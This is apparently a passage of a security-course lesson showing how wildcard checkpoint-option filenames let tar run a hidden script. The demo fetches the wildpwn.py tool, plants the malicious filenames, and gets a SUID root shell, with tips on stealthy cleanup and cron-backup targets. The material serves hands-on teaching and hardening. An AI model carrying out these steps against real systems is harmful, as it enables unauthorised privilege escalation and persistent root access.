- `--checkpoint-action=du` specifies the action for the given checkpoint. In this case, the action displays available disk space.

The general syntax of checkpoint commands is:

 `--checkpoint=[n]` and `--checkpoint-action=[ACTION]`

Next, we show how a hacker can exploit a system vulnerability:

- In our previous Linux unit, we learned why system administrators must harden a system against attacks.


- Once hackers find a weakness in a system, they exploit that weakness by changing existing code or uploading and running their own code.  The latter of which is **arbitrary command execution**, or **ACE**.

- ACE vulnerabilities are extremely dangerous, because attackers can exploit them to accomplish almost anything.  The ultimate goal is gaining root access to the machine, at which point the hacker "owns" the machine.

- For our current example, hackers have discovered how to use the `tar` checkpoint option with a wildcard to plant malicious code on a system, which they can later run to gain root privileges on the machine.


### Using Checkpoints and Wildcards to Exploit a System

Hackers can exploit `tar` using the following steps:

- A hacker gains access to the system by impersonating a normal user. This can happen if a hacker is, for example, able to get that user’s password.

    - A normal user cannot access sensitive files, open network connections, or perform other actions that require root privileges.


    - But a normal user is typically able to download and execute files from the internet.

    - A hacker can exploit this by downloading and executing malicious files.

- Today, we’ll see how hackers can use `wildpwn.py`, a Python file that is readily available on the  web, to exploit `tar` and gain root privileges.

    - Downloading and running `wildpwn.py` will create malicious files in that normal user’s home directory.

    - Specifically, `wildpwn.py` will plant three malicious files on the system: one hidden malicious script, and two other files that are disguised as `tar` checkpoint options.

- When an unsuspecting administrator with root privileges runs the `tar` command with the wildcard option to create an archive containing this directory, `tar` will execute this malicious script.


    - The script, in turn, will use the administrator’s root privileges to create malware on the system.

    - The hacker will later use this malware to drop into a root shell, granting root access to the system.

It's okay if you're a little confused at this point. We’ll dive into the specifics of `wildpwn.py` and further explain this exploit.

- When a hacker runs `wildpwn.py`, it creates three files. The script will create these files even if the hacker only has normal user privileges. The files that are created are a malicious hidden script called `.webscript` and two files disguised as `tar` checkpoint options.

- The checkpoint files look like this:

    - `--checkpoint=1`

    - `--checkpoint-action=exec=sh .webscript`

- `--checkpoint=1` tells `tar` to execute the checkpoint action after adding the first file to the archive. In other words, these checkpoint files will cause `tar` to execute the malicious `.webscript` almost immediately.

- When an unsuspecting system administrator runs `tar`, the system will mistakenly interpret the above filenames as checkpoint options, and those "options" will cause `tar` to execute `.webscript`.

- If an administrator runs this command with root privileges, i.e. `sudo tar...`, the malicious `.webscript` will run with root privileges as well — meaning it can do anything to the system!

- When `.webscript` is run with root privileges, it creates a hidden folder named `.cache`, and a hidden file named `.cachefile` inside of `.cache`.  `.cachefile` is a malicious program that the hacker can later run to open a root shell.



- Leaving the final malware in a hidden directory called `.cache`, within a hidden file called `.cachefile`, is a very subtle and stealthy deployment method. The administrator will probably have no idea that the file has been created, and will not see either the `.cache` directory or the `.cachefile` unless they list all files with the `-a` flag.

The hacker cannot simply run `.webscript`, as the script require root privileges.  So the hacker needs a user with root privileges, i.e. a system administrator to run it. 



#### Exploiting `tar` Demo

We'll use the following scenario:

- A hacker has gained access to our system by stealing the password for the instructor user.


- For this example we pretend that instructor user does not have root access, but in your activity you will truly be working with a user who does not have root access.

- We will pretend to be the hacker and use `wildpwn.py` to plant malicious files. These files will be executed when an administrator with root privileges runs the tar command.


Open up a terminal and run the following commands:

- Create a new directory for this demonstration: `mkdir ~/Documents/exploit_demo`

- Move to the `exploit_demo` directory with: 

    -  `cd /Documents/exploit_demo`

    - This is the directory to which the hacker would download the `wildpwn.py` program.

Download the script with `wget`.

- Then, run `ls -l` to show that the `wildpwn.py` program is in this directory.

     
    - `wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py`

    - `ls -l`
     
    ```
     -rw-r--r--   1 instructor  instructor   3.6K Dec 19 12:46 wildpwn.py
    ```

Type  `python wildpwn.py tar .` This will create both the malicious script and checkpoint files.

- Syntax breakdown:

    - `python` is used to run Python programs.
    - `wildpwn.py` is the program we’re executing.
    - `tar` tells `wildpwn.py` to create malicious files that will exploit the `tar` command. This is necessary because `wildpwn.py` can exploit other commands as well.
    - The `.` specifies that these files should be created in the current directory.

- Run the command and show the output:

    - `python wildpwn.py tar .`
    ```  
    [!] selected payload tar

    [*] Done! Now wait for something like: archive.tar * on . Good Luck!
    ```

Running `wildpwn.py` has successfully planted all the files needed for an attacker to exploit the system. These malicious files will be executed as soon as an administrator creates a `tar` archive containing them.

You should see something similar in your exploit_demo directory:

- Run `ls -alh`

drwxr-xr-x  2 sysadmin sysadmin 4096 Jun 11 19:16  ./
drwxr-xr-x 17 sysadmin sysadmin 4096 Jun 11 19:16  ../
-rw-r--r--  1 sysadmin sysadmin    0 Jun 11 19:16 '--checkpoint=1'
-rw-r--r--  1 sysadmin sysadmin    0 Jun 11 19:16 '--checkpoint-action=exec=sh .webscript'
-rw-r--r--  1 sysadmin sysadmin  535 Jun 11 19:16  .webscript
-rw-r--r--  1 sysadmin sysadmin 3699 Jun 11 19:16  wildpwn.py

- These are files whose names look like `tar` options. Normal users would never use such filenames: this is something that only hackers would do. 

What do you think the file `--checkpoint-action=exec=sh .webscript` will do when it’s interpreted as a checkpoint command?

  - When an administrator uses `tar` to create an archive containing this file, it will cause `tar` to run the program `.webscript` as a checkpoint action. Note that the period `.` before `webscript` indicates that it is a hidden file. It can only be displayed using the `-a` option with `ls`. 

- Let's archive this directory to activate the script.

- Remember, we need a user with root privileges to run the `tar` command and archive the directory which contains the malicious files.


Now, use `tar` with a wildcard to create an archive and generate the malicious files: 

- `sudo tar cf archive.tar *`

    - Note that this command is run from _inside_ the directory where `.webscript` is located. If it were run elsewhere, the backdoor would not be generated.

    - Getting this exploit to work obviously requires that the system administrator create the archive from the folder that contains `.webscript`. Common targets, i.e. good places to hide such malware are `/tmp`, users' home directories, and users' `Documents` directories, as these are often backed up.

Let's examine the directory now, after the `tar` command was run.

- Show how the directory listing has changed. The .webscript file “cleans up”, removing itself and the two malicious faux checkpoint files, in addition to creating hidden malicious files.

- It would be really helpful to look at the code of .webscript. There are many familiar commands that you should understand. Specifically, you can see the “clean up” commands.

Notice the SUID part!!!!! This is just as important as root:root ownership!!!

- Run: `ls -la`
    ```
     drwxrwxr-x 3 instructor instructor  4096 Apr 28 19:53 .
    -rw-r--r-- 1 root       root       10240 Apr 28 19:53 archive.tar
    drwxr-xr-x 2 root       root        4096 Apr 28 19:53 .cache
    -rw-rw-r-- 1 instructor instructor  3699 Apr 28 19:50 wildpwn.py
    drwxr-xr-x 5 instructor instructor  4096 Apr 28 19:49 ..
    ```

Note the following about this output:

- There is a new directory called `.cache` that we will explore in just a moment.

- The three malicious files have been disappeared!  On your own, examine the `.webscript` file (you can run wildpwn.py again to download the `.webscript` again) to find out how it "cleans up after itself."  Hackers often hide their tracks... 

Move into the new `.cache` directory and list the files located inside.

- `cd .cache`

      ```
      total 20
      drwxr-xr-x 2 root       root       4096 Jan  3 13:54 .
      drwxr-xr-x 8 instructor instructor 4096 Jan  6 10:50 ..
      -rwsr-xr-x 1 root       root       8392 Jan  3 13:54 .cachefile
      ```


There is just one file located here, called `.cachefile`, and it is executable.
Not only is it executable by owner, group, and other, but the SUID bit is also set!  Whoever runs this script will have their permissions elevated to root!

- Run: `./.cachefile` to execute it.

- Note: this file's owner and group are root:root.  We are able to execute it only because the execute permission is set for owner, group, AND other.  This is a good example of how executable permissions should be cautiously granted!

The change in user prompt from `instructor` to `root` that shows we now have root access.

- The `.cachefile` that we ran was owned by `root`, which is why running the script is able to give us root privileges.


- `.cachefile` is owned by the root user because we ran the archive command with `sudo tar...` not just `tar...`. If we didn't prefix the command with `sudo`, the `.cachefile` wouldn't do anything (specifically, it would change our user to instructor instead of `root`, which is useless to a hacker).  Furthermore, the SUID bit is set!


* In practice, an administrator would not manually run `sudo tar ...` to back up a directory.

    - Instead, the system use `cron` to run an automated backup on a set schedule, such as every Friday, and would do so with root privileges. This is because it needs to archive files belonging to every user, and the only user who has permissions to modify everyone's files is `root`.

This is great for a hacker because if the system administrator schedules regular backups, and uses the wildcard character, it's likely that these malicious files will be included in a backup.

- The hacker can then simply wait until this happens, and then have a method to gain access to the `root` account.

- In the next exercise, you will log in as an unprivileged user without `sudo` rights, run the exploit to generate the malicious files, and find a `.cachefile` owned by `root` that allows you to escalate privileges.

-On your own,  download and run the malicious python script again.  Examine carefully the contents of `.webscript`.  Look for clues as to how the permissions and SUID were set.  What else do you discover?  What kind of file is `.cachefile`, most likely.  Hint: Google is your friend!

### 13. Activity: Exploiting `tar`  

- [Activity File: Exploiting `tar`](Activities/13_Exploiting_Tar/Unsolved/README.md)

### 14. Activity Review: Exploiting `tar`

- [Solution Guide: Exploiting `tar`](Activities/13_Exploiting_Tar/Solved/README.md)

---
#### Copyright

© 2020 Trilogy Education Services, a 2U, Inc. brand.  All Rights Reserved.
